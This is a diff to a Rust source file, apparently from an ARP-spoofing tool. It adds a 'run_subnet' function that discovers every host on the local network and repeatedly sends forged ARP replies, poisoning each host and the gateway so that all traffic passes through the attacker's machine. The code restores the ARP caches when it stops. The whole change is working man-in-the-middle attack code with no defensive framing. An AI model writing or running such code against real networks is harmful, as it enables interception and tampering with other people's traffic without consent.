@@ -7,10 +7,11 @@ use std::sync::Arc;
 use std::thread;
 use std::time::Duration;
 
-use pnet::datalink::NetworkInterface;
+use pnet::datalink::{MacAddr, NetworkInterface};
 use pnet::packet::arp::ArpOperations;
 
 use crate::net::{build_arp, err, iface_ipv4, open_channel, resolve_mac};
+use crate::scan;
 
 pub fn run(
     iface: &NetworkInterface,
@@ -85,6 +86,67 @@ pub fn run(
     for _ in 0..5 {
         tx.send_to(&heal_target, None);
         tx.send_to(&heal_gateway, None);
+        thread::sleep(Duration::from_millis(200));
+    }
+    println!("done — LAN restored.");
+    Ok(())
+}
+
+/// Subnet-wide MITM: poison every discovered host against the gateway.
+pub fn run_subnet(
+    iface: &NetworkInterface,
+    gateway_ip: Ipv4Addr,
+    interval: u64,
+    running: Arc<AtomicBool>,
+) -> std::io::Result<()> {
+    let src_mac = iface.mac.ok_or_else(|| err("interface has no MAC"))?;
+    let src_ip = iface_ipv4(iface).ok_or_else(|| err("interface has no IPv4"))?;
+
+    println!("discovering hosts...");
+    let hosts: Vec<(Ipv4Addr, MacAddr)> = scan::discover(iface)?
+        .into_iter()
+        .filter(|(ip, _)| *ip != gateway_ip && *ip != src_ip)
+        .collect();
+    let gateway_mac = resolve_mac(iface, src_mac, src_ip, gateway_ip, Duration::from_secs(3))
+        .ok_or_else(|| err("could not resolve gateway MAC"))?;
+    if hosts.is_empty() {
+        return Err(err("no other hosts discovered"));
+    }
+    println!("MITM {} host(s) <-> gateway {gateway_ip} — Ctrl+C to stop and restore\n", hosts.len());
+
+    let (mut tx, _rx) = open_channel(iface, None)?;
+    let mut rounds = 0u64;
+    while running.load(Ordering::SeqCst) {
+        for (ip, mac) in &hosts {
+            // tell the host we are the gateway, and the gateway we are the host
+            tx.send_to(
+                &build_arp(src_mac, gateway_ip, *mac, *mac, *ip, ArpOperations::Reply),
+                None,
+            );
+            tx.send_to(
+                &build_arp(src_mac, *ip, gateway_mac, gateway_mac, gateway_ip, ArpOperations::Reply),
+                None,
+            );
+        }
+        rounds += 1;
+        print!("\r  sent {rounds} round(s) across {} host(s)", hosts.len());
+        use std::io::Write;
+        let _ = std::io::stdout().flush();
+        thread::sleep(Duration::from_secs(interval.max(1)));
+    }
+
+    println!("\n\nrestoring ARP caches...");
+    for _ in 0..5 {
+        for (ip, mac) in &hosts {
+            tx.send_to(
+                &build_arp(gateway_mac, gateway_ip, *mac, *mac, *ip, ArpOperations::Reply),
+                None,
+            );
+            tx.send_to(
+                &build_arp(*mac, *ip, gateway_mac, gateway_mac, gateway_ip, ArpOperations::Reply),
+                None,
+            );
+        }
         thread::sleep(Duration::from_millis(200));
     }
     println!("done — LAN restored.");
